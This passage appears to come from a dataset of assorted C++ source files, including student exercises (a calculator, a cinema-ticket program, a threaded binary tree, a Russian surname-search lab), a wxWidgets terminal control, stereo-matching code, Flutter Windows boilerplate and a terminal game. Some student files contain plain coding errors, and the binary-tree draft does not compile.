value of z.\"<<endl;\r\n\t\t\t\tcin>>z;\r\n\t\t\t\tcout<<\"y = \"<<4*x + z<<endl;\r\n\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tcase 3:{\r\n\t\t\t\tcout<<\"Ok,\\ny = 3xz + (x^3 / z^2)\"<<endl;\r\n\t\t\t\tcout<<\". Enter the value of x.\"<<endl;\r\n\t\t\t\tcin>>x;\r\n\t\t\t\tcout<<\". Now, enter the value of z.\"<<endl;\r\n\t\t\t\tcin>>z;\r\n\t\t\t\tcout<<\"y = \"<<3*x*z + (x^3 / z^2)<<endl;\r\n\t\t\t\t\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\tdefault:\r\n\t\t\t\tcout<<\"Invalid input.\";\t\r\n\t}\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\r\n\treturn 0;\r\n}",
    "#include \"terminalCtrl.h\"\n\n#include <unordered_set>\n\nnamespace\n{\n    std::unordered_set<int> allowedKeys {\n        wxKeyCode::WXK_LEFT,\n        wxKeyCode::WXK_RIGHT,\n        wxKeyCode::WXK_UP,\n        wxKeyCode::WXK_DOWN,\n        wxKeyCode::WXK_HOME,\n        wxKeyCode::WXK_END\n    };\n}\n\nTerminalCommandEvent::TerminalCommandEvent(wxEventType eventType, TerminalCtrl* ctrl, const wxString& command)\n    : wxCommandEvent(eventType, ctrl->GetId())\n    , command(command)\n{\n    this->SetEventObject(ctrl);\n}\n\nTerminalCommandEvent* TerminalCommandEvent::Clone() const\n{\n    return new TerminalCommandEvent(*this);\n}\n\nconst wxString& TerminalCommandEvent::getCommand()\n{\n    return this->command;\n}\n\nwxDEFINE_EVENT(terminalctrlEVT_COMMAND, TerminalCommandEvent);\nwxDEFINE_EVENT(terminalctrlEVT_POST_COMMAND, TerminalCommandEvent);\n\nTerminalCtrl::TerminalCtrl()\n    : wxTextCtrl()\n{\n    this->setup();\n}\n\nTerminalCtrl::TerminalCtrl(wxWindow* parent, wxWindowID id,\n    const wxString& value,\n    const wxPoint& pos,\n    const wxSize& size,\n    long style,\n    const wxValidator& validator,\n    const wxString& name)\n    : wxTextCtrl(parent, id, value, pos, size, createDefaultStyle(style), validator, name)\n{\n    this->setup();\n}\n\nlong TerminalCtrl::createDefaultStyle(long style)\n{\n    return style | wxTE_MULTILINE | wxTE_PROCESS_ENTER | wxTE_PROCESS_TAB | wxWS_EX_VALIDATE_RECURSIVELY;\n}\n\nvoid TerminalCtrl::setup()\n{    \n    this->insertPrompt();\n\n    Bind(wxEVT_CHAR, &TerminalCtrl::onChar, this);\n    Bind(wxEVT_KEY_DOWN, &TerminalCtrl::onChar, this);\n}\n\nvoid TerminalCtrl::setPrompt(const wxString& prompt)\n{\n    bool newLineRequested = this->newLineRequested;\n    if (this->handlingCommand)\n        this->newLineRequested = false;\n\n    wxString command = this->getInput();\n    this->clearInput();\n    this->prompt = prompt;\n    this->updatePrompt();\n    this->setInput(command);\n\n    this->newLineRequested = newLineRequested;\n}\n\nvoid TerminalCtrl::setPrompt(const wxString& prompt, const wxString& promptSuffix)\n{\n    bool newLineRequested = this->newLineRequested;\n    if (this->handlingCommand)\n        this->newLineRequested = false;\n\n    wxString command = this->getInput();\n    this->clearInput();\n    this->prompt = prompt;\n    this->promptSuffix = promptSuffix;\n    this->updatePrompt();\n    this->setInput(command);\n\n    this->newLineRequested = newLineRequested;\n}\n\nvoid TerminalCtrl::setPromptSuffix(const wxString& promptSuffix)\n{\n    bool newLineRequested = this->newLineRequested;\n    if (this->handlingCommand)\n        this->newLineRequested = false;\n\n    wxString command = this->getInput();\n    this->clearInput();\n    this->promptSuffix = promptSuffix;\n    this->updatePrompt();\n    this->setInput(command);\n\n    this->newLineRequested = newLineRequested;\n}\n\nwxString TerminalCtrl::getInput() const\n{\n    long start = this->getPosition(this->promptEndPosition);\n    long end = this->getPosition(this->getLastPoint());\n    return this->GetRange(start, end);\n}\n\nvoid TerminalCtrl::setCommandQueueLimit(size_t limit)\n{\n    this->commands.limit(limit);\n}\n\nvoid TerminalCtrl::nextCommand()\n{\n    if (!this->commands.empty())\n    {\n        this->setInput(this->commands.next());\n    }\n}\n\nvoid TerminalCtrl::prevCommand()\n{\n    if (!this->commands.empty())\n    {\n        this->setInput(this->commands.prev());\n    }\n}\n\nbool TerminalCtrl::toggleCommand(int key)\n{\n    if (key == wxKeyCode::WXK_UP)\n    {\n        this->nextCommand();\n        return true;\n    }\n    else if (key == wxKeyCode::WXK_DOWN)\n    {\n        this->prevCommand();\n        return true;\n    }\n\n    return false;\n}\n\nvoid TerminalCtrl::clearInput()\n{\n    long promptEnd = this->getPosition(this->promptEndPosition);\n    long end = this->getPosition(this->getLastPoint());\n    this->Remove(promptEnd, end);\n}\n\nvoid TerminalCtrl::setInput(const wxString& input)\n{\n    this->noAppendProcessing = true;\n    this->clearInput();\n    this->AppendText(input);\n    this->noAppendProcessing = false;\n    this->setInsertionAtEnd();\n}\n\nbool TerminalCtrl::insertionAtLastLine() const\n{\n    wxPoint insertionPoint = this->getPoint(this->GetInsertionPoint());\n    return insertionPoint.y == this->GetNumberOfLines() - 1;\n}\n\nbool TerminalCtrl::insertionAtInput() const\n{\n    wxPoint insertionPoint = this->getPoint(this->GetInsertionPoint());\n    return insertionPoint.y == this->promptEndPosition.y && insertionPoint.x >= this->promptEndPosition.x;\n}\n\nvoid TerminalCtrl::setInsertionAtEnd()\n{\n    long pos = this->getPosition(this->getLastPoint());\n    this->DoSetSelection(pos, pos, 0);\n}\n\nvoid TerminalCtrl::setInsertionAtPrompt()\n{\n    long pos = this->getPosition(this->promptEndPosition);\n    this->DoSetSelection(pos, pos, 0);\n}\n\nwxPoint TerminalCtrl::getPoint(long position) const\n{\n    wxPoint res;\n    long x, y;\n    this->PositionToXY(position, &x, &y);\n    res.x = x;\n    res.y = y;\n    return res;\n}\n\nwxPoint TerminalCtrl::getLastPoint() const\n{\n    return this->getPoint(this->GetValue().length());\n}\n\nlong TerminalCtrl::g",
    "#include \"sgm.h\"\n\n\n\nint main(int argc, char** argv) {\n\n    if (argc != 7) {\n        cerr << \"Usage: \" << argv[0] << \" <right image> <left image> <monocular_right>  <gt disparity map> <output image file> <disparity range> \" << endl;\n        return -1;\n    }\n\n    char *firstFileName = argv[1];\n    char *secondFileName = argv[2];\n    char *monoRightFileName = argv[3];\n    char *gtFileName = argv[4];\n    char *outputFileName = argv[5];\n    unsigned int disparityRange = atoi(argv[6]);\n\n    cv::Mat firstImage;\n    cv::Mat secondImage;\n    cv::Mat monoRight;\n    cv::Mat gt;\n\n    firstImage = cv::imread(firstFileName, IMREAD_GRAYSCALE);\n    secondImage = cv::imread(secondFileName, IMREAD_GRAYSCALE);\n    monoRight = cv::imread(monoRightFileName, IMREAD_GRAYSCALE);\n    gt = cv::imread(gtFileName, IMREAD_GRAYSCALE);\n\n    if(!firstImage.data || !secondImage.data) {\n        cerr <<  \"Could not open or find one of the images!\" << endl;\n        return -1;\n    }\n\n\n\n    sgm::SGM sgm(disparityRange);\n    sgm.set(firstImage, secondImage, monoRight);\n    sgm.compute_disparity();\n    sgm.save_disparity(outputFileName);\n    //sgm.save_confidence(outputFileName);\n    std::cerr<<\"Right Image MSE error: \"<<sgm.compute_mse(gt)<<std::endl;\n\n    return 0;\n}\n",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n// struktur untuk data film bioskop\r\nstruct film {\r\n    string judul;\r\n    int harga;\r\n\r\n};\r\n\r\n// fungsi untung menampilkan menu film\r\nvoid tampilkanMenu (film daftarFilm[], int jumlahFilm){\r\n    cout << \"Daftar film yang tersedia: \\t\" << endl;\r\n    for (int i = 0; i < jumlahFilm; ++i){\r\n        cout << i+1 << \". \" << daftarFilm[i].judul << \"- Rp\" << daftarFilm[i].harga << endl;\r\n    }\r\n}\r\n\r\n// fungsi untuk menghitung harga total harga film bioskop\r\nint hitungTotalHarga(film daftarFilm[], int jumlahFilm, int beli[]){\r\n    int totalHarga = 0;\r\n    for (int i = 0; i < jumlahFilm; ++i){\r\n        totalHarga += daftarFilm[i].harga * beli[i];\r\n    }\r\n    return totalHarga;\r\n}\r\n\r\nint main(){\r\n    // inisialisasi daftar film\r\n    const int JUMLAH_FILM = 5;\r\n    film daftarFilm[JUMLAH_FILM] = {\r\n        {\"Inside Out 2\", 45000},\r\n        {\"Agak Laen\", 45000},\r\n        {\"Exhuma\", 50000},\r\n        {\"Wonka\", 50000},\r\n        {\"Barbie\", 60000},\r\n    };\r\n\r\n    // inisialisasi jumlah tiket yang dibeli\r\n    int beli[JUMLAH_FILM] = {0};\r\n\r\n    // menampilkan menu film \r\n    tampilkanMenu(daftarFilm, JUMLAH_FILM);\r\n\r\n    // meminta pengguna untuk memilih film\r\n    int pilihan;\r\n    do {\r\n        cout << \"\\nMasukkan nomor film yang ingin di tonton (0 untuk selesai): \";\r\n        cin >> pilihan;\r\n        if (pilihan >= 1 && pilihan <= JUMLAH_FILM){\r\n            int jumlah;\r\n            cout << \"Masukkan jumlah tiket untuk \" << daftarFilm[pilihan-1].judul << \": \";\r\n            cin >> jumlah;\r\n            beli[pilihan-1] += jumlah;\r\n        } else if (pilihan != 0){\r\n            cout << \"Nomor film tidak valid. Silahkan coba lagi.\" << endl;\r\n        }\r\n    } while (pilihan != 0);\r\n\r\n    // menghitung total harga\r\n    int totalHarga = hitungTotalHarga(daftarFilm, JUMLAH_FILM, beli);\r\n\r\n    // meminta pengguna untuk memberikan uang\r\n    int uang;\r\n    cout <<\"\\nTotal harga: Rp\" << totalHarga << endl;\r\n    do {\r\n        cout << \"Masukkan uang Anda: Rp\";\r\n        cin >> uang;\r\n        if (uang < totalHarga){\r\n            cout << \"Uang Anda kurang. Silahkan masukkan uang yang cukup. \";\r\n        }\r\n    } while (uang < totalHarga);\r\n\r\n    // menghitung kembalian\r\n    int kembalian = uang - totalHarga;\r\n    cout << \"Kembalian Anda: Rp\" << kembalian << endl;\r\n\r\n    return 0;\r\n}",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\nclass node{\r\n\tpublic:\r\n\t\tint data;\r\n\t\tint lbit,rbit;\r\n\t\tnode*left,*right;\r\n};\r\nclass TBT\r\n{\r\n\tprivate:\r\n\t\tnode*root,*dummy;\r\n\tpublic;\r\n\tvoid create(int num);\r\n\tvoid insert (node*trav,node*temp);\r\n\tvoid preorder();\r\n\tvoid display();\r\nTBT()\r\n    {\r\n    root-NULL;\r\n\tdummy-NULL;\t\r\n\t}\t\r\n}*root,*dummy;\r\nvoid TBT::creatw(int num)\r\n{\r\n\tnode *trave,*temp;\r\n\ttemp=new node();\r\n\ttemp->data=num;\r\n\ttemp->lbit=0;\r\n\ttemp->rbit=0;\r\n\tif (root==NULL){\r\n\t\t\r\n\t\tdummy=new node;\r\n\t\tdummy->lbit=0;\r\n\t\tdummy->rbit=0;\r\n\t\tdummy->left=temp;\r\n\t\tdummy->right=dummy;\r\n\t\tdummy->left=dummy;\r\n\t\tdummy->right=dummy;\r\n\t\troot=temp;\r\n\t}\r\n\telse(\r\n\t\ttrav=root;\r\n\t\tinsert(trav,temp);\r\n\t)\r\n}\r\nvoid TBT::insert(node*trav,node*temp)\r\n{\r\n\tif(temp->data<trav->data)\r\n\t{\r\n\t\tif(trav->lbit=0)\r\n\t\t{\r\n\t\t\ttemp->left=trav->left;\r\n\t\t\ttemp->right=trav;\r\n            trav->left=temp;\r\n\t\t\ttrav->lbit=1;\r\n\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tinsert(trav->left,temp);\r\n\r\n\t\t}\r\n\t}\r\n\tif(temp->data>trav->data)\r\n\t{\r\n\t\tif(trav->rbit==0)\r\n\t\t{\r\n\t\t\ttemp->right=trav->rbit;\r\n\t\t\ttemp->left=trav;\r\n            trav->right=temp;\r\n\t\t\ttrav->rbit=1;\r\n\t\t}\r\n\t\telse{\r\n\t\t\tinsert(trav->right,temp);\r\n\t\t}\r\n\t}\r\n\t\r\n}\r\nvoid TBT ::preorder()\r\n{\r\n\t node *trav;\r\n\t trav=root;\r\n\t while (trav!=dummy)\r\n\t {\r\n\t\t/* code */\r\n\t\tcout<<trav->data<<endl;\r\n\t\tif (trav->bit==1)\r\n\t\t{\r\n\t\t\t/* code */\r\n\t\t\ttrav=trav->left;\r\n\r\n\t\t}else\r\n\t\t{\r\n\t\t\twhile (trav->bit==0 && trav->right=dummy)\r\n\t\t\t{\r\n\t\t\t\t/* code */\r\n\t\t\t\ttrav=trav->right;\r\n\r\n\t\t\t}\r\n\t\t\ttrav=trav->right;\r\n\r\n\t\t\t\r\n\t\t}\r\n\t\t\r\n\t }\r\n\t \r\n}\r\nvoid TBT::display()\r\n{\r\nint i,n,data;\r\ncout<<\"\\n enter the number of nodes  \\n\";\r\ncin>>n;\r\ncout<<\"\\n Enter the data In Nodes \\n\";\r\nfor(i=0;i<n;i++){\r\n\tcin>>data;\r\n\tcreate(data)\r\n}\r\ncout<<\"\\n Preorder: \\n\";\r\npreorder();\r\n}\r\nint main(){\r\n\tTBT T;\r\n\tT.display();\r\n\treturn 0;\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"suraj_expense_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <array>\n#include <chrono>\n#include <iostream>\n#include <math.h>\n#include <random>\n#include <string>\n#include <termios.h>\n#include <thread>\n#include <unistd.h>\n#include <vector>\n\n#define PI 3.14159265358979323846264338\n\nvoid restrictToRange(int width, int height, int &x, int &y){\n    if (x < 0){\n        x = 0;\n    }\n    if (x >= width){\n        x = width - 1;\n    }\n    if (y < 0){\n        y = 0;\n    }\n    if (y >= height){\n        y = height - 1;\n    }\n}\n\nbool testRange(int width, int height, int x, int y){\n    return (x >= 0) && (x < width) && (y >= 0) && (y < height);\n}\n\nvoid mygotoxy(short x, short y){\n    std::cout << \"\\033[\" << y << ';' << x << 'H';\n}\n\nchar mygetch() {\n    char buf = 0;\n    auto old = termios{};\n    if (tcgetattr(0, &old) < 0) {\n        throw std::runtime_error(\"tcgetattr failed\");\n    }\n    old.c_lflag &= ~ICANON;\n    old.c_lflag &= ~ECHO;\n    old.c_cc[VMIN] = 1;\n    old.c_cc[VTIME] = 0;\n    if (tcsetattr(0, TCSANOW, &old) < 0) {\n        throw std::runtime_error(\"tcsetattr failed\");\n    }\n    if (read(0, &buf, 1) < 0) {\n        throw std::runtime_error(\"read failed\");\n    }\n    old.c_lflag |= ICANON;\n    old.c_lflag |= ECHO;\n    if (tcsetattr(0, TCSADRAIN, &old) < 0) {\n        throw std::runtime_error(\"tcsetattr failed the second time\");\n    }\n    return buf;\n}\n\nclass Color {\npublic:\n    static Color BLACK;\n    static Color RED;\n    static Color GREEN;\n    static Color YELLOW;\n    static Color BLUE;\n    static Color MAGENTA;\n    static Color CYAN;\n    static Color WHITE;\n    static Color GREY;\n    static Color BRIGHT_RED;\n    static Color BRIGHT_GREEN;\n    static Color BRIGHT_YELLOW;\n    static Color BRIGHT_BLUE;\n    static Color BRIGHT_MAGENTA;\n    static Color BRIGHT_CYAN;\n    static Color BRIGHT_WHITE;\n\n    std::uint8_t colorDigit() const noexcept {\n        return this->m_colorDigit;\n    }\n\n    bool isBright() const noexcept {\n        return this->m_isBright;\n    }\n\nprivate:\n    Color(std::uint8_t colorDigit, bool isBright) noexcept\n        : m_colorDigit(colorDigit)\n        , m_isBright(isBright)\n    {}\n\n    std::uint8_t m_colorDigit;\n    bool m_isBright;\n};\n\nColor Color::BLACK = Color(0, false);\nColor Color::RED = Color(1, false);\nColor Color::GREEN = Color(2, false);\nColor Color::YELLOW = Color(3, false);\nColor Color::BLUE = Color(4, false);\nColor Color::MAGENTA = Color(5, false);\nColor Color::CYAN = Color(6, false);\nColor Color::WHITE = Color(7, false);\nColor Color::GREY = Color(0, true);\nColor Color::BRIGHT_RED = Color(1, true);\nColor Color::BRIGHT_GREEN = Color(2, true);\nColor Color::BRIGHT_YELLOW = Color(3, true);\nColor Color::BRIGHT_BLUE = Color(4, true);\nColor Color::BRIGHT_MAGENTA = Color(5, true);\nColor Color::BRIGHT_CYAN = Color(6, true);\nColor Color::BRIGHT_WHITE = Color(7, true);\n\n\nvoid textColor(Color bg_color, Color text_color){\n    auto bg_code = 40 + bg_color.colorDigit() + (bg_color.isBright() ? 60 : 0);\n    auto text_code = 30 + text_color.colorDigit() + (text_color.isBright() ? 60 : 0);\n    std::cout << \"\\033[\" << bg_code << \"m\\033[\" << text_code << 'm';\n}\n\nvoid clearScreen(){\n    textColor(Color::BLACK, Color::WHITE);\n    std::cout << \"\\033[2J\";\n}\n\nvoid drawLine(int start_x, int start_y, int end_x, int end_y, char const* symbol, Color symbol_color){\n    textColor(Color::BLACK, symbol_color);\n    int distance = ((end_x - start_x) + (end_y - start_y));\n    for (int i = 0; i <= distance; i++){\n        int symbol_x = start_x + ((i * (end_x - start_x)) / distance);\n        int symbol_y = start_y + ((i * (end_y - start_y)) / distance);\n        mygotoxy(symbol_x, symbol_y);\n        std::cout << symbol;\n    }\n}\n\nvoid drawBox(int sx, int sy, int ex, int ey, char const* symbol, Color symbol_color, char const* title, bool empty = false){\n    drawLine(sx, sy, sx, ey, symbol, symbol_color);\n    drawLine(sx, sy, ex, sy, symbol, symbol_color);\n    drawLine(ex, sy, ex, ey, symbol, symbol_color);\n    drawLine(sx, ey, ex, ey, symbol, symbol_color);\n    if (empty){\n        for (int box_x = 1; box_x < ex - sx; box_x++){\n            for (int box_y = 1; box_y < ey - sy; box_y++){\n                mygotoxy(sx + box_x, sy + box_y);\n                std::cout << \" \";\n            }\n        }\n    }\n    mygotoxy(sx + 1, sy);\n    std::cout << title;\n}\n\ntemplate<size_t width, size_t height>\nvoid generateWorld(std::array<std::array<int, height>, width>& terrain) {\n    //turn everything into grass\n    for (int x = 0; x < width; x++){\n        for (int y = 0; y < height; y++){\n            terrain.at(x).at(y) = 2;\n        }\n    }\n\n    //add patches of sand\n    for (int i = 0; i <= 50; i++){\n        int x = rand() % width, y = rand() % height;\n        for (int j = 0; j <= 10; j++){\n            restrictToRange(width, height, x, y);\n            int temp_x, temp_y;\n            double degrees;\n\n            for (int size = 1; size <= rand() % 5; size++){\n                for (int k = 0; k <= size * PI; k++){\n                    degrees = k * 360 / size * PI;\n                    temp_x = x + (siz",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "\ufeff/*********************************************************************************************************\r\n*                               \u041a\u0443\u0440\u0441 \u041f\u0420\u041e\u0413\u0420\u0410\u041c\u041c\u0418\u0420\u041e\u0412\u0410\u041d\u0418\u0415                                                    *\r\n**********************************************************************************************************\r\n* Project type  : Win64 Console Application                                                              *\r\n* Project name  : Lab_1                                                                                  *\r\n* File name     : Lab_1.cpp                                                                              *\r\n* Language      : CPP                                                                                    *\r\n* Programmers   : \u0411\u043e\u043b\u044c\u0448\u0430\u043a\u043e\u0432\u0430 \u0410\u043b\u0451\u043d\u0430 \u0414\u0435\u043d\u0438\u0441\u043e\u0432\u043d\u0430, \u041a\u043e\u0436\u0443\u0448\u043d\u0430\u044f \u0412\u0435\u0440\u043e\u043d\u0438\u043a\u0430 \u041e\u043b\u0435\u0433\u043e\u0432\u043d\u0430                                 *\r\n* Modified By   :                                                                                        *\r\n* Created       : 01.03.2024                                                                             *\r\n* Last Revision : 02.04.2024                                                                             *\r\n* Comment       : \u0447\u0437\u0445                                                                                    *\r\n*********************************************************************************************************/\r\n\r\n#include <iostream>\r\n#include <string>\r\n#include <fstream>\r\n#include <Windows.h>\r\n\r\nusing namespace std;\r\n\r\n// \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u043f\u043e\u0438\u0441\u043a\u0430 \u043f\u043e \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u0439 \u0444\u0430\u043c\u0438\u043b\u0438\u0438\r\nint searchSurname(const char searchingSurname[], const char fullName[]);\r\n\r\nint printInitials(const char fullName[], int nameIndex, int otchIndex);\r\n\r\nint main()\r\n{\r\n    setlocale(LC_ALL, \"RUSSIAN\");\r\n\r\n    // \u041d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0430 \u043a\u043e\u0434\u0438\u0440\u043e\u0432\u043a\u0438 \u0434\u043b\u044f \u0432\u0432\u043e\u0434\u0430 \u0441 \u043a\u043e\u043d\u0441\u043e\u043b\u0438\r\n    SetConsoleOutputCP(1251);\r\n    SetConsoleCP(1251);\r\n\r\n    ifstream file;\r\n\r\n    file.open(\"fam.txt\");\r\n\r\n    int i = 0; // \u0421\u0447\u0435\u0442\u0447\u0438\u043a \u0441\u0442\u0440\u043e\u043a\r\n    int nameIndex = 0; // \u0418\u043d\u0434\u0435\u043a\u0441 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0430 \u0438\u043c\u0435\u043d\u0438\r\n    int otchIndex = 0; // \u0418\u043d\u0434\u0435\u043a\u0441 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u0430 \u043e\u0442\u0447\u0435\u0441\u0442\u0432\u0430\r\n    char searchingSurname[256]; // \u0424\u0430\u043c\u0438\u043b\u0438\u044f, \u043f\u043e \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u043e\u0441\u0443\u0449\u0435\u0441\u0442\u0432\u043b\u044f\u0435\u0442\u0441\u044f \u043f\u043e\u0438\u0441\u043a\r\n    char fullName[256]; // \u041f\u043e\u043b\u043d\u043e\u0435 \u0424\u0418\u041e\r\n    char forPrint[256]; // \u041f\u0435\u0440\u0435\u043c\u0435\u043d\u043d\u0430\u044f \u0434\u043b\u044f \u043f\u0435\u0447\u0430\u0442\u044c \u0438\u0441\u0445\u043e\u0434\u043d\u044b\u0445 \u0434\u0430\u043d\u043d\u044b\u0445\r\n    int result; // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u044f \u0444\u0430\u043c\u0438\u043b\u0438\u0439\r\n    int stop = 0; // \u041e\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0430 \u0432\u0432\u043e\u0434\u0430 \u0441 \u043a\u043e\u043d\u0441\u043e\u043b\u0438\r\n\r\n    //------------------------------------------------------------------------------\r\n    // \u0411\u041b\u041e\u041a \u0427\u0422\u0415\u041d\u0418\u042f \u0421 \u041a\u041e\u041d\u0421\u041e\u041b\u0418\r\n    //------------------------------------------------------------------------------\r\n//\r\n//    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0444\u0430\u043c\u0438\u043b\u0438\u044e, \u043f\u043e \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u0431\u0443\u0434\u0435\u0442 \u043e\u0441\u0443\u0449\u0435\u0441\u0442\u0432\u043b\u0435\u043d \u043f\u043e\u0438\u0441\u043a:\" << endl;\r\n//\r\n//    // \u0437\u0430\u043f\u0438\u0441\u044c \u0444\u0430\u043c\u0438\u043b\u0438\u0438, \u043f\u043e \u043a\u043e\u0442\u043e\u0440\u043e\u0439 \u0438\u0434\u0435\u0442 \u043f\u043e\u0438\u0441\u043a\r\n//    cin.getline(searchingSurname, sizeof(searchingSurname), '\\n');\r\n//\r\n//    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043f\u043e\u043b\u043d\u043e\u0435 \u0424\u0418\u041e, \u0435\u0441\u043b\u0438 \u0445\u043e\u0442\u0438\u0442\u0435 \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c \u0432\u0432\u043e\u0434, \u0432\u0432\u0435\u0434\u0438\u0442\u0435 '0'\" << endl;\r\n//\r\n//    while (stop == 0) {\r\n//        for (int m = 0; m < 256; m++) {\r\n//            fullName[m] = '0';\r\n//        }\r\n//        fullName[255] = '\\0';\r\n//\r\n//        cin.getline(fullName, sizeof(fullName), '\\n');\r\n//\r\n//        // \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d\u0438\u0435 \u0432\u0432\u043e\u0434\u0430\r\n//        if (fullName[0] == '0') {\r\n//            cout << \"\u0412\u0432\u043e\u0434 \u0437\u0430\u0432\u0435\u0440\u0448\u0435\u043d!\" << endl;\r\n//            stop = 1;\r\n//        }\r\n//\r\n//        else {\r\n//            //\u0412\u044b\u0432\u043e\u0434 \u0438\u043d\u0438\u0446\u0438\u0430\u043b\u043e\u0432\r\n//            printInitials(fullName, nameIndex, otchIndex);\r\n//\r\n//            // \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0444\u0430\u043c\u0438\u043b\u0438\u0438 \u0441 \u0437\u0430\u0434\u0430\u043d\u043d\u043e\u0439 searchingsurname\r\n//            result = searchSurname(searchingSurname, fullName);\r\n//            if (result == 1) {\r\n//                 cout << \" - 